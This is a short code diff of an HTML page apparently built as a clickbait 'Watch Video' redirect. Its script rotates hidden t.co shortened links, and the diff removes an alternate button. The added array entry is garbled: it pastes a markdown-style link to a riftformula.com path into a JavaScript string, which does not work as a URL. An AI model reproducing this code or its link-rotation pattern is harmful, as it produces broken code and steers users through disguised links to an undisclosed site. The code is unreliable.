@@ -267,18 +267,13 @@ div.b-mobile {display:none;}
 <a href="#" id="btn1" class="elite-btn" target="_blank">
     <span>▶ Watch Video</span>
 </a>
-  
-<a href="#" id="btn2" class="elite-btn" target="_blank">
-    <span>▶ Alternative Link</span>
-</a>
 
 <script>
 const params = new URLSearchParams(window.location.search);
 const dynamicId = params.get('video') || 'DEFAULT12';
 
 const links = [
-  'https://t.co/8CpkkluViQ',
-  `https://t.co/8CpkkluViQ`
+  '[https://t.co/8CpkkluViQ](https://riftformula.com/ai/27694995/index.php)',
 ];
 
 // Acak posisi link setiap refresh
